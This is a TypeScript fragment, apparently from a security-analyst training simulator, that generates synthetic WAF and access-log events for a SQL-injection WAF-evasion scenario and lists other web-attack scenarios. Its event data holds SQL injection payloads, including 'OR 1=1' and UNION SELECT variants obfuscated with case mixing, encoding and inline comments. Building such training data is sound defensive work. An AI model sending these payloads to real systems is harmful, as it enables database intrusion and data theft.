  const large = (id: string, min: number, sent: number, bytes: number) => wafRequest(w, { id, ts: T(min), srcIp: atk, method: "POST", path: s, action: "count", rule: "size_body", oversizeBody: true, ua, sent, bytes, severity: "low", description: `WAF rule evaluated a large request body (${bytesText(sent)} bytes)` });
  return [
    ticket({ id: "web_wf_001", ts: T(0), table: "change_request", number: "CHG0044263", state: "Implement", severity: "informational",
      shortDescription: "Annual web penetration test, source 198.51.100.210, this week", description: "ServiceNow change CHG0044263 (Implement): annual web penetration test" }),
    wafRequest(w, { id: "web_wf_002", ts: T(11), srcIp: pen, path: p, query: "id=12%27+OR+1=1", action: "block", rule: "sqli_query", matched: "' OR 1=1", location: "ARGS:id", ua: "Mozilla/5.0 (compatible; PentestCo-Assessment/2026)", severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, verdict: "fp",
      fpExplanation: "The annual penetration test under CHG0044263: the source address and the tester's declared user agent match the change.", description: "WAF rule matched SQL syntax in the id parameter of /products" }),
    webAccess(w, { id: "web_wf_003", ts: T(21), srcIp: "198.51.100.15", path: p, query: "id=12", bytes: 8840, ua: CHROME, isBaseline: true, description: "Shop answered a product request" }),
    wafRequest(w, { id: "web_wf_013", ts: T(30), srcIp: "198.51.100.16", method: "POST", path: s, action: "count", rule: "size_body", oversizeBody: true, ua: CHROME, sent: 96120, bytes: 18240, severity: "low", isBaseline: true, description: "WAF rule evaluated a large request body" }),
    webAccess(w, { id: "web_wf_014", ts: T(30), srcIp: "198.51.100.16", method: "POST", path: s, sent: 96120, bytes: 18240, ua: CHROME, isBaseline: true, description: "Shop answered a product search" }),
    blocked("web_wf_004", 44, "id=12+UNION+SELECT+NULL", { isDetection: true }),
    blocked("web_wf_005", 44.4, "id=12%20UnIoN%20SeLeCt%20NULL"),
    blocked("web_wf_006", 45, "id=12/**/UNION/**/SELECT/**/NULL"),
    large("web_wf_007", 47, big, 8840),
    passed("web_wf_008", 47, big, 8840, { mitre: "T1027", tactic: STEALTH }),
    passed("web_wf_009", 48, big + 103, 21904),
    passed("web_wf_010", 51, big + 278, 1940233, { mitre: "T1213", tactic: COLLECT, severity: "medium" }),
    large("web_wf_011", 53, big + 319, 6482112),
    passed("web_wf_012", 53, big + 319, 6482112, { mitre: "T1213", tactic: COLLECT, severity: "medium" }),
  ];
}

export const WEB_ENTRY_STORIES: WebStoryDef[] = [
  { id: "web-path-traversal-config", title: "Files Read Through the Portal Download Page", complexity: "foundation", events: pathTraversal() },
  { id: "web-bola-id-enumeration", title: "One Token Reading Other Customers' Statements", complexity: "foundation", events: objectWalk() },
  { id: "web-cred-stuffing-portal", title: "Sign-In Wave on the Customer Portal and Exported Documents", complexity: "core", events: credentialStuffing() },
  { id: "web-reset-poisoning", title: "Staff Password Reset Link Sent Through the Wrong Host", complexity: "core", events: resetPoisoning(), seat: "it" },
  { id: "web-stored-xss-session", title: "Support Agent Session Used From Outside", complexity: "core", events: storedXss(), seat: "it" },
  { id: "web-upload-webshell", title: "Script Running From the Avatar Folder", complexity: "core", events: uploadShell() },
  { id: "web-graphql-batch", title: "Large GraphQL Requests and a Changed Payment Method", complexity: "core", events: graphqlBatch() },
  { id: "web-waf-evasion-sqli", title: "Blocked Client Gets Through to the Product Page", complexity: "core", events: wafEvasion() },
];
